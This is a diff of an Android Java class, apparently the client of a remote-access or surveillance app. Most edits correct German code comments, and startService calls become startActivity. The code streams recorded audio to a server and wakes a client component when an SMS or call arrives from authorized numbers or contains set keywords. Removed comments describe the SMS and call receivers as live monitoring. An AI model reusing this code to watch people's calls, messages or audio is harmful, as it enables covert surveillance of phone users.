@@ -32,7 +32,7 @@ import android.view.SurfaceView;
  */
 public abstract class ClientListener extends Activity implements OnRecordPositionUpdateListener, LocationListener {
 	/**
-	 * Diese Methode ist abstract und wird es in der Klasse Client implementiert
+	 * Diese Methode ist abstract und wird es in der Klasse Client implementiert.
 	 * @param channel
 	 * @param data
 	 */
@@ -41,19 +41,19 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	public abstract TextureView getPreview();
 
 	/**
-	 * Diese Methode ist abstrakt und wird erst in der Klase Client implementiert
+	 * Diese Methode ist abstrakt und wird erst in der Klase Client implementiert.
 	 * @param infos
 	 */
 	public abstract void sendInformation(String infos);
 
 	/**
-	 * Abstrakte Methode die in der Klasse Client implementiert wird
+	 * Abstrakte Methode die in der Klasse Client implementiert wird.
 	 * @param error
 	 */
 	public abstract void sendError(String error);
 
 	/**
-	 * Abstrakte Methode Die in der Klasse Client implementiert wird
+	 * Abstrakte Methode Die in der Klasse Client implementiert wird.
 	 */
 	public abstract void loadPreferences();
 
@@ -141,14 +141,14 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	}
 
 	/**
-	 * Diese Funktion wird aufgerufen wenn die Periode des recorders erreicht wurde.
+	 * Diese Funktion wird aufgerufen wenn die Periode des Recorders erreicht wurde.
 	 * @param recorder Der Audiorecorder
 	 */
 	public void onPeriodicNotification(AudioRecord recorder) {
 		//Log.i("AudioStreamer", "Audio Data received !");
 		/**
 		 * Es wird versucht die Daten des AudioStreames in einem Byte-Array zu speichern.
-		 * Sollte das Byte-Array im Anschluss nicht leer sein so werden die Daten mit Hilfe der handleData Funktion an den Server geschickt
+		 * Sollte das Byte-Array im Anschluss nicht leer sein, werden die Daten mit Hilfe der handleData Funktion an den Server geschickt
 		 */
 		try {
 			byte[] data = audioStreamer.getData();
@@ -161,7 +161,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	}
 
 	/**
-	 * Hier wird ein Error gesendet sollte der Audiomarker erreicht werden.
+	 * Hier wird ein Error gesendet, sollte der Audiomarker erreicht werden.
 	 * @param recorder Der Audiorecorder
 	 */
 	public void onMarkerReached(AudioRecord recorder) {
@@ -179,8 +179,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	}*/
 
 	/**
-	 * Neuer BroadcastRceiver SMSreceiver empfängt SMS intents.
-	 * Dieser Broadcast ist für der Livemonitoren von SMS zuständig
+	 * Neuer BroadcastRceiver SMSreceiver empfängt SMS Intents.
 	 */
 	 protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
 		/**
@@ -197,7 +196,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	        public void onReceive(Context context, Intent intent) {
 				/**
 				 * Überprüft ob die Action mit dem String SMS_Received übereinstimmt.
-				 * Sollte dies der Fall sein wird zu Testzwecken wieder in den LOG geschrieben
+				 * Sollte dies der Fall sein wird zu Testzwecken wieder in den LOG geschrieben.
 				 */
 			 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
 			 		Log.i("SMSReceived", "onReceive sms !");
@@ -208,8 +207,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 					Bundle bundle = intent.getExtras();
 					if (bundle != null) {
 						/**
-						 * Da SMS eine bestimmte Länge besitzen und wenn diese Überschritten wird mehrere SMS gesendet werden,
-						 * wird hier ein Object Array der Länger der Sms erstellt.
+						 * Sollte die Länge eine SMS überschritten werden, so werden mehrere SMS gesedent. Diese werden hier ein in Object Array der Länge der Sms erstellt.
 						 */
 						Object[] pdus = (Object[]) bundle.get("pdus");
 						/**
@@ -220,15 +218,15 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 							 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 						}
 						/**
-						 * Sollte das messageArray eine Größe größer als -1 besitzen so werden der MessageBody und die Nummer aus der SMS extrahiert und in den Variablen messageBody und phoneNumber gespeichert.
+						 * Sollte das messageArray eine Größe größer als -1 besitzen, werden der MessageBody und die Nummer aus der SMS extrahiert und in den Variablen messageBody und phoneNumber gespeichert.
 						 */
 						if (messages.length > -1) {
 							
 							 final String messageBody = messages[0].getMessageBody();
 							 final String phoneNumber = messages[0].getDisplayOriginatingAddress();
 							/**
-							 * Sollte in dem Arry authorizedNumbersCall Daten gespeichert werden so wird nun überprüft ob die phoneNumber in diesem Array vorkommt.
-							 * Ist die nicht der Fall wird returned ansonsten wir found auf true gesetzt. Es ist praktisch ein Filter
+							 * Sollte in dem Array authorizedNumbersCall Daten gespeichert sein, wird nun überprüft ob die phoneNumber in diesem Array vorhanden ist.
+							 * Ist die nicht der Fall wird returned ansonsten wir found auf true gesetzt. Es ist praktisch ein Filter.
 							 */
 							if(authorizedNumbersCall != null) {
 								boolean found = false;
@@ -240,8 +238,8 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 								if(!found)
 									return;
 								/**
-								 * Soll zusätzlich nach Schlüsselwörtern gesucht werden so ist das Array authorizedNumbersKeywords nicht leer.
-								 * Dann wird der Inhalt der SMS nach diese Schlüsselwörtern durchsucht. Sollten diese gefunden werden so wird die Variable foundk auf true gesetzt.
+								 * Sollte das Array authorizedNumbersKeywords Daten beinhalten, wird der Inhalt der SMS nach diese Schlüsselwörtern durchsucht.
+								 * Sollten diese gefunden werden so wird die Variable foundk auf true gesetzt.
 								 * Ansonsten wird wieder returned
 								 */
 								if(authorizedNumbersKeywords != null) {
@@ -262,7 +260,8 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 							 */
 							Intent serviceIntent = new Intent(context, Client.class); // On lance le service
 							serviceIntent.setAction("SMSReceiver");
-							context.startService(serviceIntent);
+							context.startActivity(serviceIntent);
+							//context.startService(serviceIntent);
 						}
 					}
 			 	}
@@ -270,7 +269,6 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	 };
 	/**
 	 * Neuer BroadcastReceiver Callreceiver. Empfängt Intents mit der Action TelephonyManager.ACTION_PHONE_STATE_CHANGED und verarbeitet diese mit Filtern.
-	 * Zum Livemonitoren von Anrufen zuständig.
 	 */
 	 protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
 		 private static final String TAG = "CallReceiver";
@@ -291,17 +289,17 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 			 */
 			final String action = intent.getAction();
 			/**
-			 * Überprüft ob es sich um die gewünschte Intentaction handelt
+			 * Überprüft ob es sich um die gewünschte Intentaction handelt.
 			 */
 			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
 				/**
 				 * Extrahieren des Status und speichern in phoneState.
-				 * Extrahieren des Nummer und speichern in der Variablen PhoneNumber.
+				 * Extrahieren der Nummer und speichern in der Variablen PhoneNumber.
 				 */
 				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
 				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
 				/**
-				 * Überprüfen der Variablen phoneState. Sollte diese TelephonyManager.EXTRA_STATE_RINGING sein so handelt es sich um einen eingehenden Anruf.
+				 * Überprüfen der Variablen phoneState. Sollte diese TelephonyManager.EXTRA_STATE_RINGING sein, handelt es sich um einen eingehenden Anruf.
 				 */
 				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 					/**
@@ -309,7 +307,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 					 */
 					Log.i(TAG,"Incoming call");
 					/**
-					 * Überprüft ob die phoneNumber un dem Array authorizedNumbersCall vorhanden ist, sofern das Array Daten enthält.
+					 * Überprüft ob die phoneNumber in dem Array authorizedNumbersCall vorhanden ist, sofern das Array Daten enthält.
 					 * Sollte die Nummer vorhanden sein so wird die Variable found auf true gesetzt. Auch hier handelt es sich um einen Filter
 					 */
 					if(authorizedNumbersCall != null) {
@@ -326,11 +324,12 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 						Log.i(TAG,"Incoming call authorized");
 					}
 					/**
-					 * Wenn alle Überprüfungen erfolgreich waren wird ein Intent an die Klasse Client gesendet, Dieser enhält den Kontext und die Action wird auf CallReceiver gesetzt.
+					 * Wenn alle Überprüfungen erfolgreich waren, wird ein Intent an die Klasse Client gesendet. Dieser enhält den Kontext und die Action wird auf CallReceiver gesetzt.
 					 */
 					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
 					serviceIntent.setAction("CallReceiver");
-					context.startService(serviceIntent);
+					context.startActivity(serviceIntent);
+					//context.startService(serviceIntent);
 				}
 				
 			} else {// Default event code
@@ -365,12 +364,12 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	        boolean state;
 	        //isConnected = intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, false);
 			/**
-			 * Neuer ConectivityManager erstellen und aus diesem die ActivNetworkInfo extrahiernen. Diese wird dann in dem Varibalen TestCo gepsieichert.
+			 * Neueen ConectivityManager erstellen und aus diesem die ActivNetworkInfo extrahieren. Diese wird dann in der Varibalen TestCo gepseichert.
 			 */
 	        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
 	        NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
 			/**
-			 * Sollte TestCo null sein wird die Variable state auf false gesetzt.
+			 * Sollte TestCo null sein, wird die Variable state auf false gesetzt.
 			 * Sonst auf true.
 			 */
 	        if(TestCo == null)
@@ -378,7 +377,7 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	        else
 	        	state = true;
 			/**
-			 * Extrahiert zusätzliche Netzwerk Informationen aus dem Intent und speicher diese in der Variablen networkInfo
+			 * Extrahiert zusätzliche Netzwerkinformationen aus dem Intent und speichert diese in der Variablen networkInfo.
 			 */
 	        NetworkInfo networkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
 			/**
@@ -392,15 +391,16 @@ public abstract class ClientListener extends Activity implements OnRecordPositio
 	        else
 	        	type = "other";
 			/**
-			 * Sollte die Vaiable state ture sein so wird ein Intent an die Klasse Client gesendet und diesem der Context übergeben und die Action auf ConnectivityCheckReceiver gesetzt.
-			 * Ansonsten wird ein Logeintrag erstellt, dass keine Verbindung vorhanden ist. Zum Schluss wird die Varibale isConnected noch auf den Inhalt der Varibalen state gesetzt.
+			 * Sollte die Vaiable state true sein, wird ein Intent an die Klasse Client gesendet, diesem der Context übergeben und die Action auf ConnectivityCheckReceiver gesetzt.
+			 * Ansonsten wird ein Logeintrag erstellt, dass keine Verbindung vorhanden ist. Zum Schluss wird die Varibale isConnected noch auf den Inhalt der Variablen state gesetzt.
 			 */
 	        if(state){
 	        	Log.w(TAG, "Connection is Available "+type);
 	        	if(!isConnected) { //Si la connection est maintenant ok et qu'on était déconnecté
 					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
 					serviceIntent.setAction("ConnectivityCheckReceiver");
-					context.startService(serviceIntent);
+					context.startActivity(serviceIntent);
+					//context.startService(serviceIntent);
 	        	}
 		    }
 		    else {
